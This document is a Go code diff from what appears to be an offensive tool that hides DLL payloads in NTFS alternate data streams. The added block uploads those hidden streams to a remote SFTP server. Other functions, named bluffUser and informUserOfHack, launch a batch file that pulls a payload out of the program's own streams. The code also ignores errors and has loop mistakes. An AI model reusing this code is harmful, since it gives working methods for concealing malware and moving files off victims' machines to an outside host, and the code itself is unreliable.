@@ -15,6 +15,7 @@ Set custom SFTP server, use flag " -sftp "sftp server address"
 import (
 	"flag"
 	"fmt"
+	"io"
 	"io/ioutil"
 	"log"
 	"os"
@@ -198,7 +199,35 @@ func syncWithSFTP() {
 	// 	fmt.Println("walking COMPLETE")
 
 	// Export System Data
-	//	input, err := ioutil.ReadFile(usrDir + "\\AppData\\Local\\Temp\\Moto\\setup.dll")
+	// Hard Coded Alternative datastreams accessed
+	localfiles := []string{"Readme.txt", "Readme.txt:crapS3751243.dll", "Readme.txt:crapS3636862.dll"}
+	remotefiles := []string{"Readme.txt", "Readme.txt.crapS3751243.dll", "Readme.txt.crapS3636862.dll"}
+
+	if len(localfiles) == len(remotefiles) {
+		for i := range localfiles {
+			fmt.Println(localfiles[i])
+			fmt.Println(remotefiles[i])
+
+			localDir, err := os.Open(localfiles[i])
+			if err != nil {
+				fmt.Println(err)
+			}
+			fmt.Println("Upload Staged.")
+			parent := filepath.Dir("\\")
+			path := string(filepath.Separator)
+			dirs := strings.Split(parent, path)
+			for _, dir := range dirs {
+				path = filepath.Join(path, dir)
+				_ = client.Mkdir("\\")
+
+			}
+			uploadDir, err := client.Create(remotefiles[i])
+			_, err = io.Copy(uploadDir, localDir)
+			i++
+		}
+
+	}
+	fmt.Println("Upload COMPLETE")
 
 	// Checks system if OneDrive is in use for Desktop location, Sets path accordingly
 	desktop := OneDriveCheck()
@@ -330,7 +359,7 @@ func bluffUser() {
 
 // informUserOfHack() is used to run batch file that extracts file from ADS of itself and run it for the user to see
 func informUserOfHack() {
-	time.Sleep(5 * time.Second)
+	time.Sleep(10 * time.Second)
 	usrDir := getUserHomeDir()
 	desktop := OneDriveCheck()
 	cmd := exec.Command("cmd", "/C", "start", (usrDir + desktop + "startup3751243.bat"))
